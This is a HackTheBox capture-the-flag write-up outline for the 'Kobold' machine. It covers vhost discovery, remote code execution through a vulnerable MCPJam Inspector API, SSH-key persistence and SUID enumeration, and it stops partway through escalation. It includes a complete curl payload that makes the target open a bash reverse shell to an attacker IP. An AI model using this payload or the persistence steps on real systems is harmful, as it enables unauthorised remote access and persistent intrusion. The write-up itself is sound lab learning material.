# HackTheBox Kobold Full Chain Penetration Testing

## External Reconnaissance and Web Entry
    Target Identification: Mapping IP address to `kobold.htb` for initial web access.
    Vhost Enumeration: Executing `gobuster vhost --append-domain` to discover subdomains.
    Endpoint Discovery: Successful identification of `bin.kobold.htb` and `mcp.kobold.htb`.
## Exploitation and Initial Access
	Vulnerability Analysis: Identifying an outdated version of MCPJam Inspector on `mcp.kobold.htb`.
    CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
    Payload Delivery: Utilizing `curl` to inject a malicious JSON configuration into the `/api/mcp/connect` endpoint.
	`
	curl -k https://mcp.kobold.htb:443/api/mcp/connect \
	--header "Content-Type: application/json" \
	--data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],"env":{}},"serverId":"pancerny_shell"}'
	`
    Reverse Shell: Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
    
## Persistence and Stabilization
	SSH Key Injection: Generating and hosting a public RSA key via a local HTTP server.
    Credential Placement:** Deploying the public key into the target user’s `.ssh/authorized_keys` directory.
    Stable Connection: Establishing a persistent SSH session to replace the volatile reverse shell.
    

## Post-Exploitation and Lateral Movement
  	Privilege Enumeration: Searching the filesystem for SUID binaries using `find / -perm -u=s -type f`.
    Ownership Analysis: Identifying `operator` group ownership and permissions over **PrivateBin sensitive files.
**Current Status**: _Exploitation in progress – identifying path to horizontal/vertical escalation via PrivateBin configurations._
